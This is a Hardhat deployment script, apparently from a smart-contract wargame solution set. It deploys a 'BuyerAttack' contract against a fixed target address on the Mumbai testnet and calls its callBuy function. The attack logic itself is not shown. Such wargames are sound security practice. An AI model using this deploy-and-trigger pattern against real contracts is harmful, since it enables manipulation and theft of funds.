const { ethers } = require("hardhat")
// const {
//   abi: ABIPreservation,
// } = require("../../artifacts/contracts/15/Preservation.sol/Preservation.json")
const { logTxResult } = require("../../utils/logTxResult")

require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* DEPLOY + ATTACK */
async function main() {
  /* CONTRACT NAME */
  const contractToDeploy = "BuyerAttack"
  const MyContract = await ethers.getContractFactory(contractToDeploy)
  /* @remind la private key va en hardhat.config.js */
  const ShopContract = await MyContract.deploy(
    "0x7A0C0c0ba380C438C124dC1591060F529d57FEb7"
  )
  console.log("ShopContract", ShopContract.address)

  const tx = await ShopContract.connect(signer).callBuy({
    gasLimit: 10000000,
  })
  const res = await tx.wait()
  logTxResult(res)
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/21/DeployAndCall__Attack.js --network mumbai
*/
